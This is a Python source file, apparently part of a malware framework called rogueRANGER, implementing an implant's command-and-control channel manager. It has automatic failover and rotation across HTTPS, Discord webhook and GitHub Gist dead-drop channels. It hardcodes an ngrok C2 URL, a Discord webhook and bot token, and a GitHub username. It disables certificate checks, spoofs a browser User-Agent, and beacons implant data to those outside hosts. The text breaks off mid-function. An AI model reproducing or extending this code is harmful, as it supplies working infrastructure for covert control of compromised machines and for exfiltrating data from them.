#!/usr/bin/env python3
"""
Channel Manager for rogueRANGER Phase 2
Multi-channel C2 with automatic failover and rotation
"""

import json
import base64
import time
import hashlib
import random
import threading
import queue
from typing import Dict, List, Optional, Tuple, Any, Callable
from enum import Enum
import ssl
import urllib.request
import urllib.error

class ChannelType(Enum):
    """Supported C2 channel types"""
    HTTPS = "https"
    DISCORD = "discord"
    TELEGRAM = "telegram"
    GITHUB_GIST = "github_gist"
    PASTEBIN = "pastebin"
    S3 = "s3"
    AZURE_BLOB = "azure_blob"
    GCP_STORAGE = "gcp_storage"
    DNS = "dns"
    ICMP = "icmp"

class ChannelStatus(Enum):
    """Channel status"""
    ONLINE = "online"
    DEGRADED = "degraded"
    OFFLINE = "offline"
    BLOCKED = "blocked"

class Channel:
    """Individual C2 channel configuration"""
    
    def __init__(self, 
                 channel_id: str,
                 channel_type: ChannelType,
                 config: Dict[str, Any],
                 priority: int = 1,
                 enabled: bool = True):
        self.channel_id = channel_id
        self.channel_type = channel_type
        self.config = config
        self.priority = priority  # 1 = highest priority
        self.enabled = enabled
        
        # Status tracking
        self.status = ChannelStatus.ONLINE
        self.last_check = 0
        self.success_count = 0
        self.failure_count = 0
        self.last_success = 0
        self.last_failure = 0
        self.response_time = 0
        
        # SSL context
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary for serialization"""
        return {
            'channel_id': self.channel_id,
            'channel_type': self.channel_type.value,
            'config': self.config,
            'priority': self.priority,
            'enabled': self.enabled,
            'status': self.status.value,
            'success_count': self.success_count,
            'failure_count': self.failure_count,
            'last_success': self.last_success,
            'last_failure': self.last_failure,
            'response_time': self.response_time
        }
    
    def update_status(self, success: bool, response_time: float = 0):
        """Update channel status based on operation result"""
        self.last_check = time.time()
        self.response_time = response_time
        
        if success:
            self.success_count += 1
            self.last_success = time.time()
            self.failure_count = max(0, self.failure_count - 1)  # Decay failures
            
            # Update status based on recent performance
            if self.failure_count > 5:
                self.status = ChannelStatus.DEGRADED
            else:
                self.status = ChannelStatus.ONLINE
        else:
            self.failure_count += 1
            self.last_failure = time.time()
            
            if self.failure_count > 10:
                self.status = ChannelStatus.BLOCKED
            elif self.failure_count > 3:
                self.status = ChannelStatus.DEGRADED
            else:
                self.status = ChannelStatus.OFFLINE
    
    def get_health_score(self) -> float:
        """Calculate channel health score (0.0 to 1.0)"""
        if not self.enabled:
            return 0.0
        
        base_score = 1.0
        
        # Penalize based on status
        status_penalty = {
            ChannelStatus.ONLINE: 0.0,
            ChannelStatus.DEGRADED: 0.3,
            ChannelStatus.OFFLINE: 0.6,
            ChannelStatus.BLOCKED: 1.0
        }
        
        base_score -= status_penalty.get(self.status, 0.5)
        
        # Penalize based on failure rate
        total_attempts = self.success_count + self.failure_count
        if total_attempts > 0:
            failure_rate = self.failure_count / total_attempts
            base_score -= failure_rate * 0.5
        
        # Penalize for stale success
        if self.last_success > 0:
            hours_since_success = (time.time() - self.last_success) / 3600
            if hours_since_success > 24:
                base_score -= 0.2
            elif hours_since_success > 1:
                base_score -= 0.1
        
        # Boost for high priority
        if self.priority == 1:
            base_score += 0.1
        elif self.priority == 2:
            base_score += 0.05
        
        return max(0.0, min(1.0, base_score))
    
    def is_available(self) -> bool:
        """Check if channel is available for use"""
        if not self.enabled:
            return False
        
        if self.status == ChannelStatus.BLOCKED:
            return False
        
        # If offline but not blocked, allow with low probability
        if self.status == ChannelStatus.OFFLINE:
            return random.random() < 0.1  # 10% chance
        
        return True

class ChannelManager:
    """
    Manages multiple C2 channels with automatic failover and rotation
    """
    
    def __init__(self, implant_id: str):
        self.implant_id = implant_id
        self.implant_hash = hashlib.md5(implant_id.encode()).hexdigest()[:8]
        
        # Channel storage
        self.channels: Dict[str, Channel] = {}
        self.active_channel_id: Optional[str] = None
        
        # Configuration
        self.rotation_interval = 300  # 5 minutes
        self.health_check_interval = 60  # 1 minute
        self.max_channels_per_beacon = 3
        self.encryption_enabled = True
        
        # Statistics
        self.total_beacons_sent = 0
        self.total_commands_received = 0
        self.last_rotation = 0
        self.last_health_check = 0
        
        # Thread safety
        self.lock = threading.RLock()
        
        # Initialize default channels
        self._init_default_channels()
    
    def _init_default_channels(self):
        """Initialize default channel configurations"""
        # HTTPS channel (primary)
        https_config = {
            'url': 'https://inadvertent-homographical-method.ngrok-tree.dev/',
            'method': 'POST',
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Content-Type': 'application/json'
            },
            'timeout': 10,
            'retries': 3
        }
        
        self.add_channel(
            channel_id='https_primary',
            channel_type=ChannelType.HTTPS,
            config=https_config,
            priority=1
        )
        
        # Discord fallback
        discord_config = {
            'webhook_url': 'https://discordapp.com/api/webhooks/138892227736354441388/rVwymNWwbqkXxxhhHU76KUcM3Pa0BZ01hzY0rts14EoI15GW21rRgEEaqH82FhJE',
            'bot_token': 'MTM4ODk4Mmnru^&676hhbzOTkyNTQ5OA.G7d-oM.T2IM_m_GcgH5z76GBFuuc53782jdhfdiI8GeS8U',
            'channel_id': '1324352009928376462688',
            'message_limit': 1
        }
        
        self.add_channel(
            channel_id='discord_fallback',
            channel_type=ChannelType.DISCORD,
            config=discord_config,
            priority=2
        )
        
        # GitHub Gists (dead drop)
        gist_config = {
            'username': 'h0mi3e',
            'access_token': '',  # Would be encrypted in production
            'gist_id': '',  # Dynamic discovery
            'filename': f'config_{self.implant_hash}.json'
        }
        
        self.add_channel(
            channel_id='github_gist',
            channel_type=ChannelType.GITHUB_GIST,
            config=gist_config,
            priority=3
        )
    
    def add_channel(self, 
                    channel_id: str,
                    channel_type: ChannelType,
                    config: Dict[str, Any],
                    priority: int = 1,
                    enabled: bool = True) -> bool:
        """Add a new C2 channel"""
        with self.lock:
            if channel_id in self.channels:
                print(f"[CHANNEL] Channel {channel_id} already exists")
                return False
            
            channel = Channel(
                channel_id=channel_id,
                channel_type=channel_type,
                config=config,
                priority=priority,
                enabled=enabled
            )
            
            self.channels[channel_id] = channel
            
            # If this is the first channel or higher priority, make it active
            if (self.active_channel_id is None or 
                priority < self.channels[self.active_channel_id].priority):
                self.active_channel_id = channel_id
            
            print(f"[CHANNEL] Added {channel_type.value} channel: {channel_id} (priority: {priority})")
            return True
    
    def remove_channel(self, channel_id: str) -> bool:
        """Remove a C2 channel"""
        with self.lock:
            if channel_id not in self.channels:
                return False
            
            # If removing active channel, select new active
            if self.active_channel_id == channel_id:
                self.active_channel_id = self._select_best_channel()
            
            del self.channels[channel_id]
            print(f"[CHANNEL] Removed channel: {channel_id}")
            return True
    
    def enable_channel(self, channel_id: str) -> bool:
        """Enable a channel"""
        with self.lock:
            if channel_id not in self.channels:
                return False
            
            self.channels[channel_id].enabled = True
            print(f"[CHANNEL] Enabled channel: {channel_id}")
            return True
    
    def disable_channel(self, channel_id: str) -> bool:
        """Disable a channel"""
        with self.lock:
            if channel_id not in self.channels:
                return False
            
            self.channels[channel_id].enabled = False
            
            # If disabling active channel, select new active
            if self.active_channel_id == channel_id:
                self.active_channel_id = self._select_best_channel()
            
            print(f"[CHANNEL] Disabled channel: {channel_id}")
            return True
    
    def _select_best_channel(self) -> Optional[str]:
        """Select the best available channel based on health and priority"""
        with self.lock:
            available_channels = []
            
            for channel_id, channel in self.channels.items():
                if channel.is_available():
                    health_score = channel.get_health_score()
                    # Combine health score with priority (higher priority = better)
                    score = health_score * (1.0 / channel.priority)
                    available_channels.append((score, channel.priority, channel_id))
            
            if not available_channels:
                return None
            
            # Sort by score (descending), then priority (ascending)
            available_channels.sort(key=lambda x: (-x[0], x[1]))
            
            return available_channels[0][2]
    
    def rotate_channel(self, force: bool = False) -> bool:
        """Rotate to a different channel"""
        with self.lock:
            current_time = time.time()
            
            # Check if rotation is needed
            if not force and current_time - self.last_rotation < self.rotation_interval:
                return False
            
            new_channel_id = self._select_best_channel()
            
            if new_channel_id is None:
                print("[CHANNEL] No available channels for rotation")
                return False
            
            if new_channel_id == self.active_channel_id:
                # Already on best channel
                self.last_rotation = current_time
                return False
            
            old_channel_id = self.active_channel_id
            self.active_channel_id = new_channel_id
            self.last_rotation = current_time
            
            old_channel = self.channels.get(old_channel_id)
            new_channel = self.channels[new_channel_id]
            
            print(f"[CHANNEL] Rotated from {old_channel_id} to {new_channel_id}")
            print(f"[CHANNEL] New channel: {new_channel.channel_type.value} (health: {new_channel.get_health_score():.2f})")
            
            return True
    
    def get_active_channel(self) -> Optional[Channel]:
        """Get the currently active channel"""
        with self.lock:
            if self.active_channel_id is None:
                return None
            return self.channels.get(self.active_channel_id)
    
    def get_channel(self, channel_id: str) -> Optional[Channel]:
        """Get a specific channel"""
        with self.lock:
            return self.channels.get(channel_id)
    
    def get_available_channels(self, limit: Optional[int] = None) -> List[Channel]:
        """Get list of available channels"""
        with self.lock:
            available = []
            
            for channel in self.channels.values():
                if channel.is_available():
                    available.append(channel)
            
            # Sort by priority
            available.sort(key=lambda x: x.priority)
            
            if limit is not None:
                available = available[:limit]
            
            return available
    
    def send_beacon(self, beacon_data: Dict[str, Any]) -> Tuple[bool, Optional[Dict[str, Any]]]:
        """
        Send beacon through best available channel
        Returns: (success, response_data)
        """
        with self.lock:
            self.total_beacons_sent += 1
            
            # Try active channel first
            active_channel = self.get_active_channel()
            if active_channel and active_channel.is_available():
                success, response = self._send_via_channel(active_channel, beacon_data)
                if success:
                    return True, response
            
            # If active channel fails, try other available channels
            available_channels = self.get_available_channels()
            
            for channel in available_channels:
                if channel.channel_id == self.active_channel_id:
                    continue  # Already tried
                
                success, response = self._send_via_channel(channel, beacon_data)
                if success:
                    # This channel worked better, make it active
                    self.active_channel_id = channel.channel_id
                    return True, response
            
            # All channels failed
            print("[CHANNEL] All channels failed for beacon")
            return False, None
    
    def _send_via_channel(self, channel: Channel, beacon_data: Dict[str, Any]) -> Tuple[bool, Optional[Dict[str, Any]]]:
        """Send beacon via specific channel"""
        start_time = time.time()
        
        try:
            # Add implant metadata
            enhanced_beacon = {
                'implant_id': self.implant_id,
                'implant_hash': self.implant_hash,
                'timestamp': time.time(),
                'channel_id': channel.channel_id,
                'channel_type': channel.channel_type.value,
                'data': beacon_data
            }
            
            # Encrypt if enabled
            if self.encryption_enabled:
                enhanced_beacon['encrypted'] = True
                # In production, would encrypt here
                pass
            
            # Send based on channel type
            if channel.channel_type == ChannelType.HTTPS:
                response = self._send_https(channel, enhanced_beacon)
            elif channel.channel_type == ChannelType.DISCORD:
                response = self._send_discord(channel, enhanced_beacon)
            elif channel.channel_type == ChannelType.GITHUB_GIST:
                response = self._send_github_gist(channel, enhanced_beacon)
            else:
                print(f"[CHANNEL] Unsupported channel type: {channel.channel_type}")
                channel.update_status(False)
                return False, None
            
            response_time = time.time() - start_time
            channel.update_status(True, response_time)
            
            print(f"[CHANNEL] Beacon sent via {channel.channel_type.value} ({response_time:.2f}s)")
            return True, response
            
        except Exception as e:
            response_time = time.time() - start_time
            channel.update_status(False, response_time)
            
            print(f"[CHANNEL] Error sending via {channel.channel_type.value}: {e}")
            return False, None
    
    def _send_https(self, channel: Channel, beacon_data: Dict[str, Any]) -> Dict[str, Any]:
        """Send beacon via HTTPS"""
        config = channel.config
        
        # Prepare request
        url = config['url']
        method = config.get('method', 'POST')
        headers = config.get('headers', {})
        timeout = config.get('timeout', 10)
        
        # Convert beacon to JSON
        beacon_json = json.dumps(beacon_data).encode('utf-8')
        
        # Create request
        req = urllib.request.Request(
            url=url,
            data=beacon_json,
            headers=headers,
            method=method
        )
        
        # Send request
        with urllib.request.urlopen(req, timeout=timeout, context=channel.ssl_context) as response:
            response_data = response.read().decode('utf-8')
            
            # Parse response
            try:
                return json.loads(response_data)
            except json.JSONDecodeError:
                return {'raw_response': response_data, 'status_code': response.getcode()}
    
    def _send_discord(self, channel